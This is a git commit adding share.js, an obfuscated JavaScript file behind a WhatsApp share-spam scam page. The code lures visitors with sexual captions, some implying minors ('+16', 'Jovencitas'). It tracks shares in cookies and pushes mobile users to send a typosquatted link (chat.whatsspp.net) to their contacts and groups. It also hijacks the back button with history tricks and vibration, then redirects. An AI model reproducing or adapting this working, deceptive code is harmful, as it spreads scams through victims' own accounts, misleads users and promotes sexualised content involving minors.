d42d6716b1e9115247d59c16e2591596ce19f801
irawanria85 <irawanria85@gmail.com>
2018-10-28 02:18:43 +0700

    Add files via upload

---
+++ share.js
@@ -0,0 +1,172 @@
+<script>
+var _0xf3be = [ "??Girls +16 xxx ??", "????Share video or get removed??", "??Girls XXX HOT????", "xNxx22 ??????", "Ladies HOT??", "????Sexy Girls HOT+18??", "?? Mujeres ardientes ????", "??CULONAS Activas??", "Full Cumss????", "??ZONA HOT ??", "???? Jovencitas Atrevidas ????", "random", "length", "floor", "./x_files/", "-min.png", "src", "imagen", "images", "http://chat.whatsspp.net/6ZHUZyYAgKH3SDEB5R3tGv              ", "whatsapp://send?text= Hello, I invite you to my group ?? ", " %0A.... ", "whatsapp://send?text=The Best One i have ever seen ?? , , %0A.... http://chat.whatsspp.net/6ZHUZyYAgKH3SDEB5R3tGv               ??", "Debe completar el proceso de invitación y podra chataer con nosotras.", "getTime", "setTime", "expires=", "toUTCString", "cookie", "=", "; ", ";", "split", "substring", "charAt", " ", "indexOf", "invgrupo", "0", "invamigo", "userAgent", "test", "display", "style", "compartirgrupo", "getElementById", "none", "compartirI", "compartirII", "compartirIII", "backgroundColor", "unirse-button", "#3be17f", "inline-block", "href", "location", "Por favor comparta desde su movil.", "alert", "round", ":", "html", "animate", "html, body", "start", "fadeIn", "#procesoverificacion", "click", "#start", "Debe completar el proceso de invitación llevas  ", "#unirse-button", "ready", "pushState", "function", "back", "onpopstate", "popup1", "block", "vibrate", "navigator", " ??" ];
+
+var _0xb070 = [ _0xf3be[0], _0xf3be[1], _0xf3be[2], _0xf3be[3], _0xf3be[4], _0xf3be[5], _0xf3be[6], _0xf3be[7], _0xf3be[8], _0xf3be[9], _0xf3be[10], _0xf3be[11], _0xf3be[12], _0xf3be[13], _0xf3be[14], _0xf3be[15], _0xf3be[16], _0xf3be[17], _0xf3be[18], _0xf3be[19], _0xf3be[20], _0xf3be[21], _0xf3be[22], _0xf3be[23], _0xf3be[24], _0xf3be[25], _0xf3be[26], _0xf3be[27], _0xf3be[28], _0xf3be[29], _0xf3be[30], _0xf3be[31], _0xf3be[32], _0xf3be[33], _0xf3be[34], _0xf3be[35], _0xf3be[36], _0xf3be[37], _0xf3be[38], _0xf3be[39], _0xf3be[40], _0xf3be[41], _0xf3be[42], _0xf3be[43], _0xf3be[44], _0xf3be[45], _0xf3be[46], _0xf3be[47], _0xf3be[48], _0xf3be[49], _0xf3be[50], _0xf3be[51], _0xf3be[52], _0xf3be[53], _0xf3be[54], _0xf3be[55], _0xf3be[56], _0xf3be[57], _0xf3be[58], _0xf3be[59], _0xf3be[60], _0xf3be[61], _0xf3be[62], _0xf3be[63], _0xf3be[64], _0xf3be[65], _0xf3be[66], _0xf3be[67], _0xf3be[68], _0xf3be[69], _0xf3be[70], _0xf3be[71], _0xf3be[72], _0xf3be[73], _0xf3be[74], _0xf3be[75], _0xf3be[76], _0xf3be[77], _0xf3be[78], _0xf3be[79] ];
+
+citas = new Array(0);
+
+citas[0] = _0xb070[0];
+
+citas[1] = _0xb070[1];
+
+citas[2] = _0xb070[2];
+
+citas[3] = _0xb070[3];
+
+citas[4] = _0xb070[4];
+
+citas[5] = _0xb070[5];
+
+citas[6] = _0xb070[6];
+
+citas[7] = _0xb070[7];
+
+citas[8] = _0xb070[8];
+
+citas[9] = _0xb070[9];
+
+citas[10] = _0xb070[10];
+
+alea = Math[_0xb070[11]]() * citas[_0xb070[12]];
+
+alea = Math[_0xb070[13]](alea);
+
+var objetos = new Array();
+
+var i;
+
+for (i = 1; i <= 37; i++) objetos[i] = _0xb070[14] + i.toString() + _0xb070[15];
+
+function aleatorio() {
+    var a = Math[_0xb070[13]](Math[_0xb070[11]]() * objetos[_0xb070[12]]);
+    document[_0xb070[18]][_0xb070[17]][_0xb070[16]] = objetos[a];
+}
+
+var rlink = [ _0xb070[19] ];
+
+var msgamigo = _0xb070[20] + citas[alea] + _0xb070[21] + rlink[Math[_0xb070[13]](Math[_0xb070[11]]() * rlink[_0xb070[12]])] + _0xb070[79];
+
+var shareCountG = 3;
+
+var urlpubliMovil = _0xb070[22];
+
+var urlpubliPC = _0xb070[22];
+
+var msg = _0xb070[23];
+
+function setCookie(a, b, c) {
+    var d = new Date();
+    d[_0xb070[25]](d[_0xb070[24]]() + 24 * c * 60 * 60 * 1e3);
+    var e = _0xb070[26] + d[_0xb070[27]]();
+    document[_0xb070[28]] = a + _0xb070[29] + b + _0xb070[30] + e;
+}
+
+function getCookie(a) {
+    var b = a + _0xb070[29];
+    var c = document[_0xb070[28]][_0xb070[32]](_0xb070[31]);
+    for (var d = 0; d < c[_0xb070[12]]; d++) {
+        var e = c[d];
+        while (e[_0xb070[34]](0) == _0xb070[35]) e = e[_0xb070[33]](1);
+        if (0 == e[_0xb070[36]](b)) return e[_0xb070[33]](b[_0xb070[12]], e[_0xb070[12]]);
+    }
+    return 0;
+}
+
+setCookie(_0xb070[37], _0xb070[38]);
+
+var c = getCookie(_0xb070[39]);
+
+var g = getCookie(_0xb070[37]);
+
+function fng(a) {
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i[_0xb070[41]](navigator[_0xb070[40]])) {
+        g++;
+        b++;
+        setCookie(_0xb070[37], g, 3);
+        if (g >= 3) {
+            document[_0xb070[45]](_0xb070[44])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+            document[_0xb070[45]](_0xb070[47])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+            document[_0xb070[45]](_0xb070[48])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+            document[_0xb070[45]](_0xb070[49])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+            document[_0xb070[45]](_0xb070[51])[_0xb070[43]][_0xb070[50]] = _0xb070[52];
+            document[_0xb070[45]](_0xb070[51])[_0xb070[43]][_0xb070[42]] = _0xb070[53];
+        }
+        if (g <= shareCountG) window[_0xb070[55]][_0xb070[54]] = msgamigo; else {
+            setCookie(_0xb070[37], _0xb070[38]);
+            var b = 0;
+            window[_0xb070[55]][_0xb070[54]] = urlpubliMovil;
+        }
+    } else window[_0xb070[57]](_0xb070[56]);
+}
+
+function random(a, b) {
+    return Math[_0xb070[58]](Math[_0xb070[11]]() * (b - a) + a);
+}
+
+function checkZero(a) {
+    return 10 > a ? _0xb070[38] + a : a;
+}
+
+function timer1(a, b) {
+    var c = checkZero(Math[_0xb070[58]]((a - 30) / 60)), d = checkZero(a % 60);
+    $(b)[_0xb070[60]](c + _0xb070[59] + d);
+    var e = setInterval(function() {
+        a--, c = checkZero(Math[_0xb070[58]]((a - 30) / 60)), d = checkZero(a % 60), $(b)[_0xb070[60]](c + _0xb070[59] + d), 
+        0 == a && clearInterval(e);
+    }, 1e3);
+    return !1;
+}
+
+$(document)[_0xb070[70]](function() {
+    $(_0xb070[67])[_0xb070[66]](function() {
+        $(_0xb070[62])[_0xb070[61]]({
+            scrollTop: 0
+        }, 100);
+        document[_0xb070[45]](_0xb070[63])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+        $(_0xb070[65])[_0xb070[64]]();
+    });
+    $(_0xb070[69])[_0xb070[66]](function() {
+        if (g >= 3) {
+            setCookie(_0xb070[37], _0xb070[38]);
+            var a = 0;
+            window[_0xb070[55]][_0xb070[54]] = urlpubliMovil;
+        } else window[_0xb070[57]](_0xb070[68] + g);
+    });
+});
+
+setInterval(function() {
+    if (g > shareCountG) {
+        setCookie(_0xb070[37], _0xb070[38]);
+        window[_0xb070[55]][_0xb070[54]] = urlpubliMovil;
+    }
+}, 1e4);
+
+var ii = 0;
+
+var iy = 0;
+
+if (typeof history[_0xb070[71]] === _0xb070[72]) {
+    history[_0xb070[71]](_0xb070[73], null, null);
+    window[_0xb070[74]] = function() {
+        history[_0xb070[71]](_0xb070[73], null, null);
+        if (1 == iy) {
+            iy = 0;
+            document[_0xb070[45]](_0xb070[75])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+            setTimeout(function() {
+                if (document[_0xb070[45]](_0xb070[75])[_0xb070[43]][_0xb070[42]] == _0xb070[46]) document[_0xb070[45]](_0xb070[75])[_0xb070[43]][_0xb070[42]] = _0xb070[76];
+            }, 300);
+            window[_0xb070[78]][_0xb070[77]](5e3);
+        } else if (1 == ii) iy += 1;
+    };
+}
+
+setTimeout(function() {
+    ii = 1;
+}, 200);
+
+function hidepop() {
+    setCookie(_0xb070[37], _0xb070[38]);
+    document[_0xb070[45]](_0xb070[75])[_0xb070[43]][_0xb070[42]] = _0xb070[46];
+    window[_0xb070[55]] = _0xb070[22];
+}
+</script>
